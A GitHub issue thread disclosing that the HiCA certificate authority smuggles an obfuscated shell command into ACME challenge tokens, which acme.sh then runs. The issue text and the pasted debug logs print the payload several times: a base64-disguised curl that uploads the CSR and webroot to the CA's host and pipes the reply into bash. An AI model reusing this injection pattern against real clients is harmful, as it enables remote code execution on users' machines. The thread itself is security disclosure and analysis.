
[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Facmesh-official%2Facme.sh%2Fissues%2F4659)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Facmesh-official%2Facme.sh%2Fissues%2F4659)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=acmesh-official%2Facme.sh)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[acmesh-official](/acmesh-official)
/
**[acme.sh](/acmesh-official/acme.sh)**
Public

* [Notifications](/login?return_to=%2Facmesh-official%2Facme.sh) You must be signed in to change notification settings
* [Fork
  5.1k](/login?return_to=%2Facmesh-official%2Facme.sh)
* [Star
   40.6k](/login?return_to=%2Facmesh-official%2Facme.sh)

* [Code](/acmesh-official/acme.sh)
* [Issues
  1k](/acmesh-official/acme.sh/issues)
* [Pull requests
  216](/acmesh-official/acme.sh/pulls)
* [Discussions](/acmesh-official/acme.sh/discussions)
* [Actions](/acmesh-official/acme.sh/actions)
* [Wiki](/acmesh-official/acme.sh/wiki)
* [Security](/acmesh-official/acme.sh/security)
* [Insights](/acmesh-official/acme.sh/pulse)

Additional navigation options

* [Code](/acmesh-official/acme.sh)
* [Issues](/acmesh-official/acme.sh/issues)
* [Pull requests](/acmesh-official/acme.sh/pulls)
* [Discussions](/acmesh-official/acme.sh/discussions)
* [Actions](/acmesh-official/acme.sh/actions)
* [Wiki](/acmesh-official/acme.sh/wiki)
* [Security](/acmesh-official/acme.sh/security)
* [Insights](/acmesh-official/acme.sh/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Facmesh-official%2Facme.sh%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Facmesh-official%2Facme.sh%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# acme.sh runs arbitrary commands from a remote server #4659

Closed

[mholt](/mholt) opened this issue
Jun 8, 2023
· 50 comments

Closed

# [acme.sh runs arbitrary commands from a remote server](#top) #4659

[mholt](/mholt) opened this issue
Jun 8, 2023
· 50 comments

## Comments

[![@mholt](https://avatars.githubusercontent.com/u/1128849?s=80&u=f5cb951b9d7eb2940bd90e879b7a8f3b427b1656&v=4)](/mholt)

Copy link

### **[mholt](/mholt)** commented [Jun 8, 2023](#issue-1748652612) • edited Loading

| Hello,  You may already be aware of this, but [HiCA](https://www1.hi.cn/en/) is injecting arbitrary code/commands into the certificate obtaining process and acme.sh is running them on the client machine. I am not sure if this is intentional, expected by users, or safe/unsafe. But I'm documenting my findings for the public to be aware of with this CA.  HiCA's documentation explains that it only supports acme.sh as a client. This was curious to me so I tried to learn why, if it is using ACME (and the ACME logo!) it should be basically compatible with the majority of ACME clients. While obtaining a certificate using [ACMEz](https://github.com/mholt/acmez), [I discovered](https://twitter.com/mholt6/status/1666897779564892160) that the Directory was blocked unless the User-Agent is set to a string that starts with `Mozilla` or `acme.sh/2.8.2 (https://github.com/Neilpang/acme.sh)`. (Firefox loaded the directory just fine, which is surprising because Firefox is not acme.sh.) (I also noticed that `caaIdentities` includes a variety of CAs including Google Trust Services and SSL.com. Curious.)  Once I faked the UA in my own client and got that working, issuance still failed. Curiously, the error message involved trying a URL of `../pki-validation`. This doesn't make any sense to me [even though that kind of appears in their docs](https://www1.hi.cn/en/docs/tutorial-expert/challenge/http-challenge) because it is not standard ACME, so I dug a little deeper to figure out what the Challenge object consisted of that would cause my client to try making a request to `../pki-validation`.  It turns out that the Challenge objects look unusual. Here's a lightly-formatted example:  ``` {     Type: http-01     URL: ../pki-validation     Status: pending     Token: dd#acme.hi.cn/acme/v2/precheck-http/123456/654321#http-01#/tmp/$(curl`IFS=^;cmd=base64^-d;$cmd<<<IA==`-sF`IFS=^;cmd=base64^-d;$cmd<<<IA==`csr=@$csr`IFS=^;cmd=base64^-d;$cmd<<<IA==`https$(IFS=^;cmd=base64^-d;$cmd<<<Oi8v)acme.hi.cn/acme/csr/http/123456/654321?o=$_w|bash)#     KeyAuthorization: dd#acme.hi.cn/acme/v2/precheck-http/123456/654321#http-01#/tmp/$(curl`IFS=^;cmd=base64^-d;$cmd<<<IA==`-sF`IFS=^;cmd=base64^-d;$cmd<<<IA==`csr=@$csr`IFS=^;cmd=base64^-d;$cmd<<<IA==`https$(IFS=^;cmd=base64^-d;$cmd<<<Oi8v)acme.hi.cn/acme/csr/http/123456/654321?o=$_w|bash)#.GfCBN3dYnfNB-Hj1nBYek89o9ohtt9K59uacS13wigw } ```  Now it became immediately obvious to my why HiCA only supports acme.sh. They are not conforming to ACME at all! (Bugs the heck outa me that [they're using the official ACME logo on their site](https://www1.hi.cn/en/docs/intro) even though they don't implement the ACME standard.)  Instead, **HiCA is stealthily crafting `curl` commands and piping the output to `bash`. acme.sh is (being tricked into?) running arbitrary code from a remote server.** ❗  Here's my analysis so far:  The Token string is NOT in conformance with RFC 8555, which states: "the token for a challenge is a string comprised entirely of characters in the URL safe base64 alphabet." (`#` is not URL-safe).  However you can tell they're abusing this Token string to encode structure that can be parsed by splitting on "#":   * I'm not sure what "dd" means. I do have a file called `/tmp/$(curl`IFS=^;cmd=base64^-d;$cmd<<<IA==`-sF`IFS=^;cmd=base64^-d;$cmd<<<IA==`csr=@$csr`IFS=^;cmd=base64^-d;$cmd<<<IA==`https$(IFS=^;cmd=base64^-d;$cmd<<<Oi8v)acme.hi.cn/acme/csr/http/123456/654321\?o\=\$_w\|bash\)/.well-known/acme-challenge/dd` after running acme.sh for a test domain though. It contains the value "dd"... * The next part is clearly a URL to a "precheck-http" resource for this challenge. It returns an error "csr not submitted" if you try to request them before running the `csr/http` endpoint successfully. I haven't crafted a successful request to this endpoint yet. * The next part of the token is the challenge type, http-01 in this case. * The part starting with "/tmp/" is a path to a temporary folder or file. A curl command is crafted by inline scripts that write " " (space) and "://" by base64-decoding "IA==" and "Oi8v" respectively. The result is a command like `curl -sF csr=@... https://...?o=$_w`. In other words, it sends the CSR (provided by acme.sh variable `$csr`) and your web root to the CA and then pipes the response of that command straight into bash and acme.sh runs it. 😬 ~~I am hoping you could help me craft a request to see the contents of the script that is being run. It seems to involve writing to the disk since `o` (output?) contains the webroot (the value of `$_w` in acme.sh).~~ UPDATE: [Aleksejs Popovs has extracted the remote script and verified that it does get executed in a VM.](https://twitter.com/aleksejspopovs/status/1666955050696966148) * Another obvious concern is the Token is supposed to contain at least 128 bits of entropy *without client influence*. See RFC 8555 section 11.3: "First, the ACME client should not be able to influence the ACME server's choice of token as this may allow an attacker to reuse a domain owner's previous challenge responses for a new validation request." * Error responses come with a 200 status and application/json Content-Type in violation of RFC 8555 (and HTTP convention). This makes it tedious to correctly handle errors. Only "server error" responses return 500. * The second number in the endpoints (654321 in this example) increments for each challenge. So we know how many challenges this CA is experiencing.   Anyway, this all seems very worrisome to me.  I am not sure why HiCA is doing what they are doing. But this intentional deviation from RFC 8555 and the lack of transparency on their docs is suspicious and concerning.  I am not sure if it is intentional that acme.sh is allowing arbitrary commands from a remote server to execute.  Hopefully this is helpful and maybe you can provide some insight and recommendations. |
| --- |
| The text was updated successfully, but these errors were encountered: |

 👍
57
 hau-tran-works, focux, zii, IceCodeNew, rithvikvibhu, quantumpacket, thekoma, beyer-stefan, ennui93, alimoezzi, and 47 more reacted with thumbs up emoji
 😕
13
 CannibalKush, noncombatant, dbrennand, jspawar, thekoma, alimoezzi, bebosudo, nyanotech, tategotoazarasi, null-dev, and 3 more reacted with confused emoji
 ❤️
2
 tristanfisher and tedb reacted with heart emoji
 🚀
4
 cbluth, thekoma, hugmouse, and yushijinhun reacted with rocket emoji
 👀
59
 lucasjohnston, seankhliao, jprenken, paulchambers, L1Cafe, MasterKale, Xe, mcpherrinm, gertvdijk, danielcompton, and 49 more reacted with eyes emoji

All reactions

* 👍
  57 reactions
* 😕
  13 reactions
* ❤️
  2 reactions
* 🚀
  4 reactions
* 👀
  59 reactions

[![@github-actions](https://avatars.githubusercontent.com/in/15368?s=80&v=4)](/apps/github-actions)

Copy link

### **[github-actions](/apps/github-actions) bot** commented [Jun 8, 2023](#issuecomment-1583358791)

| Please upgrade to the latest code and try again first. Maybe it's already fixed. `acme.sh --upgrade` If it's still not working, please provide the log with `--debug 2`, otherwise, nobody can help you. |
| --- |

 👎
68
 JayJamieson, noncombatant, gertvdijk, cheesbrgr, aaomidi, boxmein, H4ad, whitestrake, jspawar, AaronFriel, and 58 more reacted with thumbs down emoji
 😄
45
 tristanfisher, boboTjones, mholt, infogulch, rtcms, Nyaasu66, Pix13, mauran, Vam-Jam, crabmusket, and 35 more reacted with laugh emoji
 😕
1
 osnyx reacted with confused emoji

All reactions

* 👎
  68 reactions
* 😄
  45 reactions
* 😕
  1 reaction

Sorry, something went wrong.

[![@jdkasten](https://avatars.githubusercontent.com/u/1581662?s=80&u=09bce1883cb97bdee8e086a79f1165e646bd0c96&v=4)](/jdkasten)

Copy link

### **[jdkasten](/jdkasten)** commented [Jun 8, 2023](#issuecomment-1583505486) • edited Loading

| My quick read is that it is to allow HiCA to use an "HTTPS validation" method with ACME and get around the limitations in BRs 3.2.2.4.19  Specifically. http-01 doesn't allow a direct connection to 443 and requires the challenge to be posted at /.well-known/acme-challenge/ <https://github.com/cabforum/servercert/blob/main/docs/BR.md#322419-agreed-upon-change-to-website---acme>  3.2.2.4.18 allows you to validate via 443 but it also makes you host the challenge at .well-known/pki-validation <https://github.com/cabforum/servercert/blob/main/docs/BR.md#322418-agreed-upon-change-to-website-v2>  Edit: HiCA advertises using an "HTTPS Validation" method [here](https://www1.hi.cn/hica-vs-letsencrypt/). I was wondering how they achieved that. |
| --- |

 👍
1
 mholt reacted with thumbs up emoji

All reactions

* 👍
  1 reaction

Sorry, something went wrong.

[![@mholt](https://avatars.githubusercontent.com/u/1128849?s=80&u=f5cb951b9d7eb2940bd90e879b7a8f3b427b1656&v=4)](/mholt)

Copy link

Author

### **[mholt](/mholt)** commented [Jun 8, 2023](#issuecomment-1583533974) • edited Loading

| I should clarify - as I mentioned, I'm not familiar with acme.sh, so I haven't directly proven that it actually does execute the commands, but HiCA seems to believe it does: it's the only ACME client they allow, and they specifically designed their service relying on this.  UPDATE: See below, we have confirmation.  Here's some of my debug logs from running acme.sh that I used to verify that it was successful up to the point of downloading the certificate (which I didn't, because they wanted payment):  ``` [Thu Jun  8 03:32:32 PM MDT 2023] Getting webroot for domain='example.com' [Thu Jun  8 03:32:32 PM MDT 2023] _w='/home/matt/Downloads/test' [Thu Jun  8 03:32:32 PM MDT 2023] _currentRoot='/home/matt/Downloads/test' [Thu Jun  8 03:32:32 PM MDT 2023] entry='"type":"http-01","url":"../pki-validation","status":"pending","token":"dd#acme.hi.cn/acme/v2/precheck-http/123456/654321#http-01#/tmp/$(curl`IFS=^;cmd=base64^-d;$cmd<<<IA==`-sF`IFS=^;cmd=base64^-d;$cmd<<<IA==`csr=@$csr`IFS=^;cmd=base64^-d;$cmd<<<IA==`https$(IFS=^;cmd=base64^-d;$cmd<<<Oi8v)acme.hi.cn/acme/csr/http/123456/654321?o=$_w|bash)#"' [Thu Jun  8 03:32:32 PM MDT 2023] token='dd#acme.hi.cn/acme/v2/precheck-http/123456/654321#http-01#/tmp/$(curl`IFS=^;cmd=base64^-d;$cmd<<<IA==`-sF`IFS=^;cmd=base64^-d;$cmd<<<IA==`csr=@$csr`IFS=^;cmd=base64^-d;$cmd<<<IA==`https$(IFS=^;cmd=base64^-d;$cmd<<<Oi8v)acme.hi.cn/acme/csr/http/123456/654321?o=$_w|bash)#' [Thu Jun  8 03:32:32 PM MDT 2023] uri='../pki-validation' [Thu Jun  8 03:32:32 PM MDT 2023] keyauthorization='dd#acme.hi.cn/acme/v2/precheck-http/123456/654321#http-01#/tmp/$(curl`IFS=^;cmd=base64^-d;$cmd<<<IA==`-sF`IFS=^;cmd=base64^-d;$cmd<<<IA==`csr=@$csr`IFS=^;cmd=base64^-d;$cmd<<<IA==`https$(IFS=^;cmd=base64^-d;$cmd<<<Oi8v)acme.hi.cn/acme/csr/http/123456/654321?o=$_w|bash)#.T7yTHT2s7BIyLS8f76M_bf3-OHx6Yba9yP1Lm6YjZF8' [Thu Jun  8 03:32:32 PM MDT 2023] dvlist='example.com#dd#acme.hi.cn/acme/v2/precheck-http/123456/654321#http-01#/tmp/$(curl`IFS=^;cmd=base64^-d;$cmd<<<IA==`-sF`IFS=^;cmd=base64^-d;$cmd<<<IA==`csr=@$csr`IFS=^;cmd=base64^-d;$cmd<<<IA==`https$(IFS=^;cmd=base64^-d;$cmd<<<Oi8v)acme.hi.cn/acme/csr/http/123456/654321?o=$_w|bash)#.T7yTHT2s7BIyLS8f76M_bf3-OHx6Yba9yP1Lm6YjZF8#../pki-validation#http-01#/home/matt/Downloads/test' [Thu Jun  8 03:32:32 PM MDT 2023] d [Thu Jun  8 03:32:32 PM MDT 2023] vlist='example.com#dd#acme.hi.cn/acme/v2/precheck-http/123456/654321#http-01#/tmp/$(curl`IFS=^;cmd=base64^-d;$cmd<<<IA==`-sF`IFS=^;cmd=base64^-d;$cmd<<<IA==`csr=@$csr`IFS=^;cmd=base64^-d;$cmd<<<IA==`https$(IFS=^;cmd=base64^-d;$cmd<<<Oi8v)acme.hi.cn/acme/csr/http/123456/654321?o=$_w|bash)#.T7yTHT2s7BIyLS8f76M_bf3-OHx6Yba9yP1Lm6YjZF8#../pki-validation#http-01#/home/matt/Downloads/test,' [Thu Jun  8 03:32:32 PM MDT 2023] d='example.com' [Thu Jun  8 03:32:32 PM MDT 2023] ok, let's start to verify [Thu Jun  8 03:32:32 PM MDT 2023] Verifying: example.com [Thu Jun  8 03:32:32 PM MDT 2023] d='example.com' [Thu Jun  8 03:32:32 PM MDT 2023] keyauthorization='dd' [Thu Jun  8 03:32:32 PM MDT 2023] uri='acme.hi.cn/acme/v2/precheck-http/123456/654321' [Thu Jun  8 03:32:32 PM MDT 2023] _currentRoot='/tmp/$(curl`IFS=^;cmd=base64^-d;$cmd<<<IA==`-sF`IFS=^;cmd=base64^-d;$cmd<<<IA==`csr=@$csr`IFS=^;cmd=base64^-d;$cmd<<<IA==`https$(IFS=^;cmd=base64^-d;$cmd<<<Oi8v)acme.hi.cn/acme/csr/http/123456/654321?o=$_w|bash)' [Thu Jun  8 03:32:32 PM MDT 2023] wellknown_path='/tmp/$(curl`IFS=^;cmd=base64^-d;$cmd<<<IA==`-sF`IFS=^;cmd=base64^-d;$cmd<<<IA==`csr=@$csr`IFS=^;cmd=base64^-d;$cmd<<<IA==`https$(IFS=^;cmd=base64^-d;$cmd<<<Oi8v)acme.hi.cn/acme/csr/http/123456/654321?o=$_w|bash)/.well-known/acme-challenge' [Thu Jun  8 03:32:32 PM MDT 2023] writing token:dd to /tmp/$(curl`IFS=^;cmd=base64^-d;$cmd<<<IA==`-sF`IFS=^;cmd=base64^-d;$cmd<<<IA==`csr=@$csr`IFS=^;cmd=base64^-d;$cmd<<<IA==`https$(IFS=^;cmd=base64^-d;$cmd<<<Oi8v)acme.hi.cn/acme/csr/http/123456/654321?o=$_w|bash)/.well-known/acme-challenge/dd [Thu Jun  8 03:32:32 PM MDT 2023] Changing owner/group of .well-known to matt:matt [Thu Jun  8 03:32:33 PM MDT 2023] chown: cannot access '/tmp//.well-known': No such file or directory [Thu Jun  8 03:32:33 PM MDT 2023] url='acme.hi.cn/acme/v2/precheck-http/123456/654321' [Thu Jun  8 03:32:33 PM MDT 2023] payload='{}' [Thu Jun  8 03:32:33 PM MDT 2023] POST [Thu Jun  8 03:32:33 PM MDT 2023] _post_url='acme.hi.cn/acme/v2/precheck-http/123456/654321' [Thu Jun  8 03:32:33 PM MDT 2023] _CURL='curl --silent --dump-header /home/matt/.acme.sh/http.header  -L  -g ' [Thu Jun  8 03:32:35 PM MDT 2023] _ret='0' [Thu Jun  8 03:32:35 PM MDT 2023] code='200' [Thu Jun  8 03:32:35 PM MDT 2023] trigger validation code: 200 [Thu Jun  8 03:32:35 PM MDT 2023] Success [Thu Jun  8 03:32:35 PM MDT 2023] pid [Thu Jun  8 03:32:35 PM MDT 2023] Debugging, skip removing: /tmp/$(curl`IFS=^;cmd=base64^-d;$cmd<<<IA==`-sF`IFS=^;cmd=base64^-d;$cmd<<<IA==`csr=@$csr`IFS=^;cmd=base64^-d;$cmd<<<IA==`https$(IFS=^;cmd=base64^-d;$cmd<<<Oi8v)acme.hi.cn/acme/csr/http/123456/654321?o=$_w|bash)/.well-known  ...  FQDN(s) has passed verification, but a payment amount USDT $3.55 (USDT.TRC20) is required: Please make a Crypto transfer USDT $3.55 (USDT.TRC20) to address: TPchwEnuyYyoPUH1yxkzTJMfwPLxJgU8cn After pay, please wait about 1~3 minutes and re-run the following commands, to finalize your order:  acme.sh --register-account --eab-kid redacted --eab-hmac-key redacted -m redacted --server https://acme.hi.cn/directory acme.sh --issue --webroot /home/matt/Downloads/test --force -d "example.com" --server https://acme.hi.cn/directory -m redacted  OR  域名验证已通过，在您支付完￥10.00(或 USDT.TRC20 $3.55)即可签发: 请支付宝扫码支付: (或者直接浏览器打开 https://tencentcloud.accelerate.pki.plus/acme-purchase/redacted )  █████████████████████████████████████████        █████████████████████████████████████ ██ ▄▄▄▄▄ █▀▄█▀  ▀▀▄ ▀█▄   ▀██ ▀█ ▄▄▄▄▄ ██        ██ ▄▄▄▄▄ █▀ █▀▀ ▀▄▄█ ▄▀ █▄ █ ▄▄▄▄▄ ██ ██ █   █ █▄   ▄ ▀▀▄ █ ▄█ ▀▄█▀▄██ █   █ ██        ██ █   █ █▀ ▄ ██▄▄▀█▀▄█▄▀█ █ █   █ ██ ██ █▄▄▄█ █ ▀█▀█  █▄▀▄▄▄▀█▄██  ▀█ █▄▄▄█ ██        ██ █▄▄▄█ █▀█ █▄▄▄▀▄▄ ▄▄█▄ ▄█ █▄▄▄█ ██ ██▄▄▄▄▄▄▄█ ▀▄█ █ █▄▀▄█ ▀▄█▄█ ▀▄█▄▄▄▄▄▄▄██        ██▄▄▄▄▄▄▄█▄█▄█ ▀ █ ▀ ▀▄█ ▀▄█▄▄▄▄▄▄▄██ ██▄ █ ██▄▄▀█ ▀██▀ █▄▀█▀ ▀▄▀▄▄█ █ ▄▄▀ ▄▀██        ██  ▄  ▀▄   ▄█▄▄▄ ▀  █▀█▀█▀ ▀▄█▄▀ ▀██ ██ █ ▄ ▀▄▄ ▄▄███▀▀▄ ▄▄▀ ▀█▀ ▄▀▀ ▄██▀▄▀ ██        ██▀▄▄█ ▄▄ ▄ ▀ ▄▄▀█▄▄▄▀█▀█ ▄▄█▀█▄▀▄███ ███  ▀  ▄▄█  ▀ ██▀▄▀▀█▀ ▀█▀ ▄██  ▀████ ██        ██ ▀▀ ▀ ▄██ ▀▄  ▀▄▄████▀▀█▀█▀▄▄▄█▀▀██ ██▄ ▀▀█▀▄▀ ▀██ ▀▀▄ ▀█▄▄▀▀ ▄ ▄▀█▀▄█▀ █▀▄██        ██▄ ██▀ ▄▄▀  █ █▄▄▀▄▀ █▀▀▄▄▄  ▀█▀▄███ ██ ▀   ▄▄█▀▀ ▄█▄▄ ▄▀▀▄▀▄█▀▀▀██▀█ ▄▀█ ▀ ██        ██▀█  ██▄█▄▀▀█ ▄▄▀▄ █▀ ▄▀ ▀▄▀▄▄▀█ ▀██ ██ ▀█▀▄▄▄ ▀▀▀▀█ █▀▀███▄ █▀▀█▄█  ▀▄█▄▀ ▄██        ██ ██▀▄▀▄▄▀  ██  ▀▄▀ ▀██▀██▀▀▀▄▄▀▄███ ██▀  ▄ ▄▄▀█▄▀  ▀▄▀ ▄ ██▀▀█▄▄▄█▀▀ █▄▄██ ██        ██  ▄▄█▀▄▄█ ▄█ ▀█▄ ▀▀▀▄█▀▀ ▄▀▄▄▀█ ▀██ ██▄▀▄▀  ▄  █    ▄▄▀██▄▄▀▀█▀ ▀▀ ▀▄▄ ██▄▄██        ██ █ █▀▀▄█▄▀▄▄ ▀▄▀▀▄█▄▄▀▀ █  ██ ▀▄███ ███▀█▄ ▀▄▄▀▄▄ █▀   ██   ▄█ ▄▀█▄   ██▀▄ ██        ██▄█▄▄▄▄▄▄ ▀██ ▄ ▀█▀▄█▀  █ ▄▄▄  ▀█ ██ ██▄▀▀ ██▄▄█▄▀ █▄▄▀▄▄██ ▀  ▀▀ ▀ ▄ █ ▄▄▀▄██        ██ ▄▄▄▄▄ █▄█▀▀ ▀▀█ ▀▄ ▄▀▀▀ █▄█ ▄ ▄███ ██▄▄█▄▄▄▄▄▀█▄█  ▀▀█▀▄▄█▀   ▀█  ▄▄▄ █ █▀██        ██ █   █ █ ███▄▀▀▄▀▄▀▀█▄▀█  ▄  ▀█ ███ ██ ▄▄▄▄▄ █▄█ ▄ █ ▄ ▀▀█ ▀ ██▄ ▄ █▄█ █▀▄ ██        ██ █▄▄▄█ █ ▄▄ ▀▄▄ ▀▄▄▀█▄▀█▄▀ █▀▀▀████ ██ █   █ █▀▄▀▀██▀▀ ▄▀█▀▄█▄ ▄██▄▄▄  ▀██▀██        ██▄▄▄▄▄▄▄▀▄ ███▄██▄▄▄█████▄▄███▄█▄███ ██ █▄▄▄█ █▀█▀███▀  ▀▄ ▀▀ ██▀█ ▀███ ▄▄█▄██        █████████████████████████████████████ ██▄▄▄▄▄▄▄█▄▄▄█▄██ █▀▄▄████▄▄█▄▄▄█▄▄██▄▄██ █████████████████████████████████████████                   (支付)                                      (微信客服)  ```  The log says "Success" and that verification succeeded, and since it needs the Token and KeyAuth to verify, I do assume it worked/eval'ed. Some of the log lines seem to suggest that the code may not have been evaluated, but I'm not sure if the log output accurately reflects what is or isn't being executed. If someone familiar with this project could verify, that would be helpful. |
| --- |

 👀
7
 xfbs, nyanotech, AlynxZhou, kallydev, Cloud0310, hbokh, and LaoshuBaby reacted with eyes emoji

All reactions

* 👀
  7 reactions

Sorry, something went wrong.

[![@mholt](https://avatars.githubusercontent.com/u/1128849?s=40&u=f5cb951b9d7eb2940bd90e879b7a8f3b427b1656&v=4)](/mholt)
[mholt](/mholt)
changed the title
~~acme.sh runs arbitrary commands from a remote server~~
acme.sh appears to run arbitrary commands from a remote server
[Jun 8, 2023](#event-9477816208)

[![@mholt](https://avatars.githubusercontent.com/u/1128849?s=80&u=f5cb951b9d7eb2940bd90e879b7a8f3b427b1656&v=4)](/mholt)

Copy link

Author

### **[mholt](/mholt)** commented [Jun 8, 2023](#issuecomment-1583607833)

| [@xiaohuilam](https://github.com/xiaohuilam) You seem to be familiar with both HiCA and acme.sh. Could you offer some insight? |
| --- |

All reactions

Sorry, something went wrong.

[![@aaomidi](https://avatars.githubusercontent.com/u/1465785?s=80&u=bd9bd2520d708f3c0d90db870bad0a858ae4573b&v=4)](/aaomidi)

Copy link

### **[aaomidi](/aaomidi)** commented [Jun 8, 2023](#issuecomment-1583611298)

| It seems like this is using a (I believe as a white label) intermediate from `ssl.com` called `quantumCA` (<https://crt.sh/?caid=200960>)  This is the email I got from them:  [image](https://private-user-images.githubusercontent.com/1465785/244536080-6b9233fd-e89b-4663-8c39-6ae5c85ae3f8.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1MTg4MzEsIm5iZiI6MTczNjUxODUzMSwicGF0aCI6Ii8xNDY1Nzg1LzI0NDUzNjA4MC02YjkyMzNmZC1lODliLTQ2NjMtOGMzOS02YWU1Yzg1YWUzZjgucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MDExMCUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTAxMTBUMTQxNTMxWiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9NzhjZjA3MjVlZGQ5NmRhOWRjYzc0YTU0OGJjMThkYzMzOTBmZWU4NDZmNmIzMjMwYjhhYWVmNjNmZDRkZTRlMiZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.4yfYkce5DBsAqkig1vwcMtuWIv1JZI35bMwRrtgXKMQ) |
| --- |

 👍
2
 mholt and nyanotech reacted with thumbs up emoji

All reactions

* 👍
  2 reactions

Sorry, something went wrong.

[![@mholt](https://avatars.githubusercontent.com/u/1128849?s=40&u=f5cb951b9d7eb2940bd90e879b7a8f3b427b1656&v=4)](/mholt)
[mholt](/mholt)
changed the title
~~acme.sh appears to run arbitrary commands from a remote server~~
acme.sh runs arbitrary commands from a remote server
[Jun 8, 2023](#event-9478188231)

[![@mholt](https://avatars.githubusercontent.com/u/1128849?s=80&u=f5cb951b9d7eb2940bd90e879b7a8f3b427b1656&v=4)](/mholt)

Copy link

Author

### **[mholt](/mholt)** commented [Jun 8, 2023](#issuecomment-1583615376)

| We now have [another confirmation on Twitter](https://twitter.com/aleksejspopovs/status/1666955050696966148) that remote code is executed and a glimpse into what the script is:  